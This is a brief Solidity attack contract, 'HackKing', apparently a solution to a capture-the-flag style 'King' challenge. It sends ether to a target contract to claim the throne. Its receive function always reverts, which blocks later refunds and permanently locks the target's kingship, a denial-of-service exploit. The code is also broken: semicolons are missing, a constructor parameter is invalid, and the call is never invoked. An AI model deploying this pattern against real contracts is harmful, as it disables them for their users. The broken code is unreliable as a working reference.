// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackKing {
  address public kingContract;

  constructor(address public _kingContract) public payable {
    kingContract = _kingContract
  }

  function crownMe(uint _value, uint _gas) public {
    address(kingContract).call.value(_value).gas(_gas)
  }

  receive() external payable {
    revert()
  }

}
